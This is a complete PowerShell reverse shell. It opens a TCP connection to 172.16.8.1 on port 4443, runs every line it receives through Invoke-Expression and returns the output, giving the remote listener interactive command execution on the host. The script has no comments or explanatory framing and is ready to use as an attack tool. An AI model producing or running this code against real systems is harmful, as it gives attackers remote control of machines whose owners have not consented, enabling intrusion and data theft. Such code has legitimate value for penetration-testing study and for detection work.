$ip = '172.16.8.1'
$port = 4443

$client = [System.Net.Sockets.TCPClient]::new($ip, $port)
$stream = $client.GetStream()
$writer = [System.IO.StreamWriter]::new($stream)
$reader = [System.IO.StreamReader]::new($stream)
$writer.AutoFlush = $true

function Execute-Command {
    param (
        [string]$cmd
    )
    try {
        $result = Invoke-Expression $cmd 2>&1
        if ($result -isnot [string]) {
            $result = $result | Out-String
        }
    } catch {
        $result = $_.Exception.Message
    }
    return $result
}

while ($client.Connected) {
    $cmd = $reader.ReadLine()
    if ($cmd -eq 'exit') { break }
    $result = Execute-Command -cmd $cmd
    $writer.WriteLine($result)
}

$writer.Close()
$reader.Close()
$client.Close()
